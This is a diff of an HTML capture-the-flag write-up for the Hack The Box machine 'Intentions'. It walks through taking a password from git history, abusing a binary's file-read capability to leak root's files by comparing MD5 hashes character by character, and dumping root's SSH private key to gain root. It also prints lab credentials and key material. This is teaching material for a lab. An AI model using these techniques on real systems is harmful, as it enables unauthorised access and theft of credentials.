 <span class="n">Date</span><span class="p">:</span>   <span class="n">Mon</span> <span class="n">Jan</span> <span class="mi">30</span> <span class="mi">15</span><span class="p">:</span><span class="mi">29</span><span class="p">:</span><span class="mi">12</span> <span class="mi">2023</span> <span class="o">+</span><span class="mi">0100</span>
@@ -973,7 +973,7 @@ I've downloaded the Git repository to my local machine, and now I'll proceed to 
 </pre></div>
 
 Upon careful inspection of each commit, I stumbled upon some credentials within one of them:<br/><br/>
-<div class="highlight"><pre><span></span><span class="nd">@elswix@kali</span><span class="err">$</span> <span class="n">git</span> <span class="n">show</span> <span class="n">f7c903a54cacc4b8f27e00dbf5b0eae4c16c3bb4</span>
+<div class="highlight"><pre><span></span><span class="nd">elswix@kali</span><span class="err">$</span> <span class="n">git</span> <span class="n">show</span> <span class="n">f7c903a54cacc4b8f27e00dbf5b0eae4c16c3bb4</span>
 <span class="n">commit</span> <span class="n">f7c903a54cacc4b8f27e00dbf5b0eae4c16c3bb4</span>
 <span class="n">Author</span><span class="p">:</span> <span class="n">greg</span> <span class="o">&lt;</span><span class="n">greg</span><span class="nd">@intentions</span><span class="o">.</span><span class="n">htb</span><span class="o">&gt;</span>
 <span class="n">Date</span><span class="p">:</span>   <span class="n">Thu</span> <span class="n">Jan</span> <span class="mi">26</span> <span class="mi">09</span><span class="p">:</span><span class="mi">21</span><span class="p">:</span><span class="mi">52</span> <span class="mi">2023</span> <span class="o">+</span><span class="mi">0100</span>
@@ -1002,31 +1002,31 @@ Upon careful inspection of each commit, I stumbled upon some credentials within 
 </pre></div>
 
 I've uncovered the password <code>Gr3g1sTh3B3stDev3l0per!1998!</code> and I'm going to attempt to use it to access the system as the <code>greg</code> user<br/><br/>
-<div class="highlight"><pre><span></span><span class="nd">@www</span><span class="o">-</span><span class="n">data</span><span class="nd">@intentions</span><span class="p">:</span><span class="o">/</span><span class="n">tmp</span><span class="err">$</span> <span class="n">su</span> <span class="n">greg</span>
+<div class="highlight"><pre><span></span><span class="nd">www</span><span class="o">-</span><span class="n">data</span><span class="nd">@intentions</span><span class="p">:</span><span class="o">/</span><span class="n">tmp</span><span class="err">$</span> <span class="n">su</span> <span class="n">greg</span>
 <span class="n">Password</span><span class="p">:</span> 
 <span class="err">$</span> <span class="n">whoami</span>
 <span class="n">greg</span>
 <span class="err">$</span> <span class="n">bash</span>
-<span class="nd">@greg@intentions</span><span class="p">:</span><span class="o">/</span><span class="n">tmp</span><span class="err">$</span>
+<span class="nd">greg@intentions</span><span class="p">:</span><span class="o">/</span><span class="n">tmp</span><span class="err">$</span>
 </pre></div>
 
 It worked, and now we are <code>greg</code>.<br/><br/>
 <h3><br>Shell as root</br></h3><br>
 Upon examining our group memberships, it becomes apparent that we are a part of the <code>scanner</code> group:<br/><br/>
-<div class="highlight"><pre><span></span><span class="nd">@greg@intentions</span><span class="p">:</span><span class="o">/</span><span class="n">tmp</span><span class="err">$</span> <span class="nb">id</span>
+<div class="highlight"><pre><span></span><span class="nd">greg@intentions</span><span class="p">:</span><span class="o">/</span><span class="n">tmp</span><span class="err">$</span> <span class="nb">id</span>
 <span class="n">uid</span><span class="o">=</span><span class="mi">1001</span><span class="p">(</span><span class="n">greg</span><span class="p">)</span> <span class="n">gid</span><span class="o">=</span><span class="mi">1001</span><span class="p">(</span><span class="n">greg</span><span class="p">)</span> <span class="n">groups</span><span class="o">=</span><span class="mi">1001</span><span class="p">(</span><span class="n">greg</span><span class="p">),</span><span class="mi">1003</span><span class="p">(</span><span class="n">scanner</span><span class="p">)</span>
-<span class="nd">@greg@intentions</span><span class="p">:</span><span class="o">/</span><span class="n">tmp</span><span class="err">$</span>
+<span class="nd">greg@intentions</span><span class="p">:</span><span class="o">/</span><span class="n">tmp</span><span class="err">$</span>
 </pre></div>
 
 While searching for files owned by the <code>scanner</code> group, we have come across the following:<br/><br/>
-<div class="highlight"><pre><span></span><span class="nd">@greg@intentions</span><span class="p">:</span><span class="o">/</span><span class="n">tmp</span><span class="err">$</span> <span class="n">find</span> <span class="o">/</span> <span class="o">-</span><span class="n">group</span> <span class="n">scanner</span> <span class="mi">2</span><span class="o">&gt;/</span><span class="n">dev</span><span class="o">/</span><span class="n">null</span>
+<div class="highlight"><pre><span></span><span class="nd">greg@intentions</span><span class="p">:</span><span class="o">/</span><span class="n">tmp</span><span class="err">$</span> <span class="n">find</span> <span class="o">/</span> <span class="o">-</span><span class="n">group</span> <span class="n">scanner</span> <span class="mi">2</span><span class="o">&gt;/</span><span class="n">dev</span><span class="o">/</span><span class="n">null</span>
 <span class="o">/</span><span class="n">opt</span><span class="o">/</span><span class="n">scanner</span>
 <span class="o">/</span><span class="n">opt</span><span class="o">/</span><span class="n">scanner</span><span class="o">/</span><span class="n">scanner</span>
-<span class="nd">@greg@intentions</span><span class="p">:</span><span class="o">/</span><span class="n">tmp</span><span class="err">$</span>
+<span class="nd">greg@intentions</span><span class="p">:</span><span class="o">/</span><span class="n">tmp</span><span class="err">$</span>
 </pre></div>
 
 When running the script, it displays a help panel:<br/><br/>
-<div class="highlight"><pre><span></span><span class="nd">@greg@intentions</span><span class="p">:</span><span class="o">/</span><span class="n">tmp</span><span class="err">$</span> <span class="o">/</span><span class="n">opt</span><span class="o">/</span><span class="n">scanner</span><span class="o">/</span><span class="n">scanner</span>
+<div class="highlight"><pre><span></span><span class="nd">greg@intentions</span><span class="p">:</span><span class="o">/</span><span class="n">tmp</span><span class="err">$</span> <span class="o">/</span><span class="n">opt</span><span class="o">/</span><span class="n">scanner</span><span class="o">/</span><span class="n">scanner</span>
 <span class="n">The</span> <span class="n">copyright_scanner</span> <span class="n">application</span> <span class="n">provides</span> <span class="n">the</span> <span class="n">capability</span> <span class="n">to</span> <span class="n">evaluate</span> <span class="n">a</span> <span class="n">single</span> <span class="n">file</span> <span class="ow">or</span> <span class="n">directory</span> <span class="n">of</span> <span class="n">files</span> <span class="n">against</span> <span class="n">a</span> <span class="n">known</span> <span class="n">blacklist</span> <span class="ow">and</span> <span class="k">return</span> <span class="n">matches</span><span class="o">.</span>
 
     <span class="n">This</span> <span class="n">utility</span> <span class="n">has</span> <span class="n">been</span> <span class="n">developed</span> <span class="n">to</span> <span class="n">help</span> <span class="n">identify</span> <span class="n">copyrighted</span> <span class="n">material</span> <span class="n">that</span> <span class="n">have</span> <span class="n">previously</span> <span class="n">been</span> <span class="n">submitted</span> <span class="n">on</span> <span class="n">the</span> <span class="n">platform</span><span class="o">.</span>
@@ -1052,27 +1052,27 @@ When running the script, it displays a help panel:<br/><br/>
   <span class="o">-</span><span class="n">p</span>  <span class="p">[</span><span class="n">Debug</span><span class="p">]</span> <span class="n">Print</span> <span class="n">calculated</span> <span class="n">file</span> <span class="nb">hash</span><span class="o">.</span> <span class="n">Only</span> <span class="n">compatible</span> <span class="k">with</span> <span class="o">-</span><span class="n">c</span>
   <span class="o">-</span><span class="n">s</span> <span class="n">string</span>
         <span class="n">Specific</span> <span class="nb">hash</span> <span class="n">to</span> <span class="n">check</span> <span class="n">against</span><span class="o">.</span> <span class="n">Not</span> <span class="n">compatible</span> <span class="k">with</span> <span class="o">-</span><span class="n">h</span>
-<span class="nd">@greg@intentions</span><span class="p">:</span><span class="o">/</span><span class="n">tmp</span><span class="err">$</span>
+<span class="nd">greg@intentions</span><span class="p">:</span><span class="o">/</span><span class="n">tmp</span><span class="err">$</span>
 </pre></div>
 
 While listing the capabilities, we observe that the binary <code>/opt/scanner/scanner</code> has the capability to read files from the system regardless of the user's privileges who runs it.<br/><br/>
-<div class="highlight"><pre><span></span><span class="nd">@greg@intentions</span><span class="p">:</span><span class="o">/</span><span class="n">tmp</span><span class="err">$</span> <span class="n">getcap</span> <span class="o">-</span><span class="n">r</span> <span class="o">/</span> <span class="mi">2</span><span class="o">&gt;/</span><span class="n">dev</span><span class="o">/</span><span class="n">null</span>
+<div class="highlight"><pre><span></span><span class="nd">greg@intentions</span><span class="p">:</span><span class="o">/</span><span class="n">tmp</span><span class="err">$</span> <span class="n">getcap</span> <span class="o">-</span><span class="n">r</span> <span class="o">/</span> <span class="mi">2</span><span class="o">&gt;/</span><span class="n">dev</span><span class="o">/</span><span class="n">null</span>
 <span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="nb">bin</span><span class="o">/</span><span class="n">mtr</span><span class="o">-</span><span class="n">packet</span> <span class="n">cap_net_raw</span><span class="o">=</span><span class="n">ep</span>
 <span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="nb">bin</span><span class="o">/</span><span class="n">ping</span> <span class="n">cap_net_raw</span><span class="o">=</span><span class="n">ep</span>
 <span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">lib</span><span class="o">/</span><span class="n">x86_64</span><span class="o">-</span><span class="n">linux</span><span class="o">-</span><span class="n">gnu</span><span class="o">/</span><span class="n">gstreamer1</span><span class="mf">.0</span><span class="o">/</span><span class="n">gstreamer</span><span class="o">-</span><span class="mf">1.0</span><span class="o">/</span><span class="n">gst</span><span class="o">-</span><span class="n">ptp</span><span class="o">-</span><span class="n">helper</span> <span class="n">cap_net_bind_service</span><span class="p">,</span><span class="n">cap_net_admin</span><span class="o">=</span><span class="n">ep</span>
 <span class="o">/</span><span class="n">opt</span><span class="o">/</span><span class="n">scanner</span><span class="o">/</span><span class="n">scanner</span> <span class="n">cap_dac_read_search</span><span class="o">=</span><span class="n">ep</span>
-<span class="nd">@greg@intentions</span><span class="p">:</span><span class="o">/</span><span class="n">tmp</span><span class="err">$</span>
+<span class="nd">greg@intentions</span><span class="p">:</span><span class="o">/</span><span class="n">tmp</span><span class="err">$</span>
 </pre></div>
 
 Following certain tests, we can highlight the following about the <code>scanner</code> binary. Firstly, it has the ability to read files irrespective of the user's access privileges. Additionally, by specifying boundaries, we can read characters from specific files in MD5 format.<br/><br/>
 For instance, let's consider the file <code>/etc/passwd</code>. The first character of this file is <code>r</code> (for <code>root</code>). If we attempt to list the first character of the <code>/etc/passwd</code> file in MD5 format using <code>scanner</code>, it would look something like this:<br/><br/>
-<div class="highlight"><pre><span></span><span class="nd">@greg@intentions</span><span class="p">:</span><span class="o">/</span><span class="n">tmp</span><span class="err">$</span> <span class="o">/</span><span class="n">opt</span><span class="o">/</span><span class="n">scanner</span><span class="o">/</span><span class="n">scanner</span> <span class="o">-</span><span class="n">l</span> <span class="mi">1</span> <span class="o">-</span><span class="n">s</span> <span class="n">elswix</span> <span class="o">-</span><span class="n">c</span> <span class="o">/</span><span class="n">etc</span><span class="o">/</span><span class="n">passwd</span> <span class="o">-</span><span class="n">p</span> 
+<div class="highlight"><pre><span></span><span class="nd">greg@intentions</span><span class="p">:</span><span class="o">/</span><span class="n">tmp</span><span class="err">$</span> <span class="o">/</span><span class="n">opt</span><span class="o">/</span><span class="n">scanner</span><span class="o">/</span><span class="n">scanner</span> <span class="o">-</span><span class="n">l</span> <span class="mi">1</span> <span class="o">-</span><span class="n">s</span> <span class="n">elswix</span> <span class="o">-</span><span class="n">c</span> <span class="o">/</span><span class="n">etc</span><span class="o">/</span><span class="n">passwd</span> <span class="o">-</span><span class="n">p</span> 
 <span class="p">[</span><span class="n">DEBUG</span><span class="p">]</span> <span class="o">/</span><span class="n">etc</span><span class="o">/</span><span class="n">passwd</span> <span class="n">has</span> <span class="nb">hash</span> <span class="mi">4</span><span class="n">b43b0aee35624cd95b910189b3dc231</span>
-<span class="nd">@greg@intentions</span><span class="p">:</span><span class="o">/</span><span class="n">tmp</span><span class="err">$</span>
+<span class="nd">greg@intentions</span><span class="p">:</span><span class="o">/</span><span class="n">tmp</span><span class="err">$</span>
 </pre></div>
 
 Now, let's verify if it has indeed converted the first character of the <code>/etc/passwd</code> file into MD5 format (remember, it should be <code>r</code>):<br/><br/>
-<div class="highlight"><pre><span></span><span class="nd">@elswix@kali</span><span class="err">$</span> <span class="n">echo</span> <span class="o">-</span><span class="n">n</span> <span class="s1">'r'</span> <span class="o">|</span> <span class="n">md5sum</span>
+<div class="highlight"><pre><span></span><span class="nd">elswix@kali</span><span class="err">$</span> <span class="n">echo</span> <span class="o">-</span><span class="n">n</span> <span class="s1">'r'</span> <span class="o">|</span> <span class="n">md5sum</span>
 <span class="mi">4</span><span class="n">b43b0aee35624cd95b910189b3dc231</span>  <span class="o">-</span>
 </pre></div>
 
@@ -1093,13 +1093,13 @@ Let's provide a brief explanation of what we did when running the binary:<br/><b
 </li>
 </ul>
 If we were to request it to hash the first 4 characters of the <code>/etc/passwd</code> file, it would return the following:"<br/><br/>
-<div class="highlight"><pre><span></span><span class="nd">@greg@intentions</span><span class="p">:</span><span class="o">/</span><span class="n">tmp</span><span class="err">$</span> <span class="o">/</span><span class="n">opt</span><span class="o">/</span><span class="n">scanner</span><span class="o">/</span><span class="n">scanner</span> <span class="o">-</span><span class="n">l</span> <span class="mi">4</span> <span class="o">-</span><span class="n">s</span> <span class="n">elswix</span> <span class="o">-</span><span class="n">c</span> <span class="o">/</span><span class="n">etc</span><span class="o">/</span><span class="n">passwd</span> <span class="o">-</span><span class="n">p</span> 
+<div class="highlight"><pre><span></span><span class="nd">greg@intentions</span><span class="p">:</span><span class="o">/</span><span class="n">tmp</span><span class="err">$</span> <span class="o">/</span><span class="n">opt</span><span class="o">/</span><span class="n">scanner</span><span class="o">/</span><span class="n">scanner</span> <span class="o">-</span><span class="n">l</span> <span class="mi">4</span> <span class="o">-</span><span class="n">s</span> <span class="n">elswix</span> <span class="o">-</span><span class="n">c</span> <span class="o">/</span><span class="n">etc</span><span class="o">/</span><span class="n">passwd</span> <span class="o">-</span><span class="n">p</span> 
 <span class="p">[</span><span class="n">DEBUG</span><span class="p">]</span> <span class="o">/</span><span class="n">etc</span><span class="o">/</span><span class="n">passwd</span> <span class="n">has</span> <span class="nb">hash</span> <span class="mi">63</span><span class="n">a9f0ea7bb98050796b649e85481845</span>
-<span class="nd">@greg@intentions</span><span class="p">:</span><span class="o">/</span><span class="n">tmp</span><span class="err">$</span>
+<span class="nd">greg@intentions</span><span class="p">:</span><span class="o">/</span><span class="n">tmp</span><span class="err">$</span>
 </pre></div>
 
 This hash should correspond to the <code>root</code> string in MD5 format. We can verify it using <code>md5sum</code>:<br/><br/>
-<div class="highlight"><pre><span></span><span class="nd">@elswix@kali</span><span class="err">$</span> <span class="n">echo</span> <span class="o">-</span><span class="n">n</span> <span class="s2">"root"</span> <span class="o">|</span> <span class="n">md5sum</span>
+<div class="highlight"><pre><span></span><span class="nd">elswix@kali</span><span class="err">$</span> <span class="n">echo</span> <span class="o">-</span><span class="n">n</span> <span class="s2">"root"</span> <span class="o">|</span> <span class="n">md5sum</span>
 <span class="mi">63</span><span class="n">a9f0ea7bb98050796b649e85481845</span>  <span class="o">-</span>
 </pre></div>
 
@@ -1153,18 +1153,18 @@ To avoid having to check each character manually and sum them, I will create a P
 </pre></div>
 
 The usage is quite straightforward; we just need to specify the file we want to open:<br/><br/>
-<div class="highlight"><pre><span></span><span class="nd">@greg@intentions</span><span class="p">:</span><span class="o">~</span><span class="err">$</span> <span class="n">python3</span> <span class="n">exploit</span><span class="o">.</span><span class="n">py</span>  <span class="o">/</span><span class="n">root</span><span class="o">/</span><span class="n">root</span><span class="o">.</span><span class="n">txt</span>
+<div class="highlight"><pre><span></span><span class="nd">greg@intentions</span><span class="p">:</span><span class="o">~</span><span class="err">$</span> <span class="n">python3</span> <span class="n">exploit</span><span class="o">.</span><span class="n">py</span>  <span class="o">/</span><span class="n">root</span><span class="o">/</span><span class="n">root</span><span class="o">.</span><span class="n">txt</span>
 <span class="mi">0</span><span class="n">f5c7d8a90bfcf13a0327946f240fe34</span>
 
 
 <span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="n">File</span> <span class="n">saved</span> <span class="n">to</span> <span class="n">output</span><span class="o">.</span><span class="n">txt</span>
 
-<span class="nd">@greg@intentions</span><span class="p">:</span><span class="o">~</span><span class="err">$</span>
+<span class="nd">greg@intentions</span><span class="p">:</span><span class="o">~</span><span class="err">$</span>
 </pre></div>
 
 The content of the file is displayed on the screen and is also saved in the current directory in a file named <code>output.txt</code>.<br/><br/>
 Previously, we read the file <code>/root/root.txt</code>, Now, we will attempt to gain access to the system using the root user's SSH private key:<br/><br/>
-<div class="highlight"><pre><span></span><span class="nd">@greg@intentions</span><span class="p">:</span><span class="o">~</span><span class="err">$</span> <span class="n">python3</span> <span class="n">exploit</span><span class="o">.</span><span class="n">py</span> <span class="o">/</span><span class="n">root</span><span class="o">/.</span><span class="n">ssh</span><span class="o">/</span><span class="n">id_rsa</span>
+<div class="highlight"><pre><span></span><span class="nd">greg@intentions</span><span class="p">:</span><span class="o">~</span><span class="err">$</span> <span class="n">python3</span> <span class="n">exploit</span><span class="o">.</span><span class="n">py</span> <span class="o">/</span><span class="n">root</span><span class="o">/.</span><span class="n">ssh</span><span class="o">/</span><span class="n">id_rsa</span>
 <span class="o">-----</span><span class="n">BEGIN</span> <span class="n">OPENSSH</span> <span class="n">PRIVATE</span> <span class="n">KEY</span><span class="o">-----</span>
 <span class="n">b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn</span>
 <span class="n">NhAAAAAwEAAQAAAYEA5yMuiPaWPr6P0GYiUi5EnqD8QOM9B7gm2lTHwlA7FMw95</span><span class="o">/</span><span class="n">wy8JW3</span>
@@ -1207,11 +1207,11 @@ Previously, we read the file <code>/root/root.txt</code>, Now, we will attempt t
 
 <span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="n">File</span> <span class="n">saved</span> <span class="n">to</span> <span class="n">output</span><span class="o">.</span><span class="n">txt</span>
 
-<span class="nd">@greg@intentions</span><span class="p">:</span><span class="o">~</span><span class="err">$</span>
+<span class="nd">greg@intentions</span><span class="p">:</span><span class="o">~</span><span class="err">$</span>
 </pre></div>
 
 Now we can copy this key to our machine and adjust its permissions:<br/><br/>
-<div class="highlight"><pre><span></span><span class="nd">@elswix@kali</span><span class="err">$</span> <span class="n">chmod</span> <span class="mi">600</span> <span class="n">id_rsa</span>
+<div class="highlight"><pre><span></span><span class="nd">elswix@kali</span><span class="err">$</span> <span class="n">chmod</span> <span class="mi">600</span> <span class="n">id_rsa</span>
 </pre></div>
 
 Finally, we have successfully gained access as the root user via SSH:<br/><br/>
@@ -1252,24 +1252,24 @@ Finally, we have successfully gained access as the root user via SSH:<br/><br/>
 
 
 <span class="n">Last</span> <span class="n">login</span><span class="p">:</span> <span class="n">Sat</span> <span class="n">Oct</span> <span class="mi">14</span> <span class="mi">16</span><span class="p">:</span><span class="mi">48</span><span class="p">:</span><span class="mi">21</span> <span class="mi">2023</span> <span class="kn">from</span> <span class="mf">10.10.16.6</span>
-<span class="nd">@root@intentions</span><span class="p">:</span><span class="o">~</span><span class="root1">#</span>
+<span class="nd">root@intentions</span><span class="p">:</span><span class="o">~</span><span class="root1">#</span>
 </pre></div>
 
 Now, we can read the final flag:<br/><br/>
-<div class="highlight"><pre><span></span><span class="nd">@root@intentions</span><span class="p">:</span><span class="o">~</span><span class="root1">#</span><span class="n"> whoami</span>
+<div class="highlight"><pre><span></span><span class="nd">root@intentions</span><span class="p">:</span><span class="o">~</span><span class="root1">#</span><span class="n"> whoami</span>
 <span class="n">root</span>
-<span class="nd">@root@intentions</span><span class="p">:</span><span class="o">~</span><span class="root1"># </span><span class="n">id </span>
+<span class="nd">root@intentions</span><span class="p">:</span><span class="o">~</span><span class="root1"># </span><span class="n">id </span>
 <span class="n">uid</span><span class="o">=</span><span class="mi">0</span><span class="p">(</span><span class="n">root</span><span class="p">)</span> <span class="n">gid</span><span class="o">=</span><span class="mi">0</span><span class="p">(</span><span class="n">root</span><span class="p">)</span> <span class="n">groups</span><span class="o">=</span><span class="mi">0</span><span class="p">(</span><span class="n">root</span><span class="p">)</span>
-<span class="nd">@root@intentions</span><span class="p">:</span><span class="o">~</span><span class="root1">#</span><span class="n"> cat /root/root.txt</span>
+<span class="nd">root@intentions</span><span class="p">:</span><span class="o">~</span><span class="root1">#</span><span class="n"> cat /root/root.txt</span>
 <span class="mi">0</span><span class="n">f5c7</span><span class="o">***********************</span><span class="n">fe34</span>
-<span class="nd">@root@intentions</span><span class="p">:</span><span class="o">~</span><span class="root1">#</span>
+<span class="nd">root@intentions</span><span class="p">:</span><span class="o">~</span><span class="root1">#</span>
 </pre></div></br></br></br></br></br></br></br></br></br></br>
             </div>
         </div>
     </section>
 
     <footer>
-        <p>&copy; 2023 elswix.github.io</p>
+        <p>&copy; 2024 elswix.github.io</p>
     </footer>
 </body>
 </html>
